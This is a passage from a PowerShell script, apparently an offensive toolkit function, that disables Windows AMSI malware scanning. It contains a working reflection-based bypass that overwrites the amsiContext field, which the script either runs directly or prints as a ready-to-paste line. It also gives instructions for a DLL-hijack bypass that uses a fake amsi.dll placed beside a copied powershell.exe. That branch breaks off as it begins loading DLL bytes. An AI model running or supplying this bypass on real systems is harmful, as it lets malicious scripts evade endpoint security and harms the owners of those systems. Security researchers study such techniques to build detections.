            Write-Verbose "Using Matt Graeber's second Reflection method."
            if ($ShowOnly -eq $True)
            {
                Write-Output "Use the following scriptblock before you run a script which gets detected."
                Write-Output '[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiContext'',[Reflection.BindingFlags]''NonPublic,Static'').GetValue($null),0x41414141)'
            }
            else
            {
                Write-Output "Executing the bypass."
                [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
            }
        }
        "dllhijack"
        {
            Write-Verbose "Using Cornelis de Plaa's DLL hijack method."
            if ($ShowOnly -eq $True)
            {
                Write-Output "Copy powershell.exe from C:\Windows\System32\WindowsPowershell\v1.0 to a local folder and dropa fake amsi.dll in the same directory."
                Write-Output "Run the new powershell.exe and AMSI should be gone for that session."
            }
            else
            {
                [Byte[]] $temp = $DllBytes -split ' '                
                Write-Output "Executing the bypass."